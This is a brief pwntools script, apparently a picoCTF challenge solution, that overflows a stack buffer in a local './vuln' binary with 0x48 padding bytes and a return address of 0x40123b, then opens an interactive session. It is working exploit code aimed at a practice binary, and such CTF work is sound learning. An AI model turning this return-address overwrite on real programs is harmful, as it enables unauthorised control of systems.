from pwn import *

# r = remote('saturn.picoctf.net', 58166)
context.arch = 'amd64'
r = process('./vuln')
raw_input()
print(r.recvline().strip().decode())

payload = b'a'*0x48 + p64(0x40123b)
print(payload)
r.sendline(payload)

r.interactive()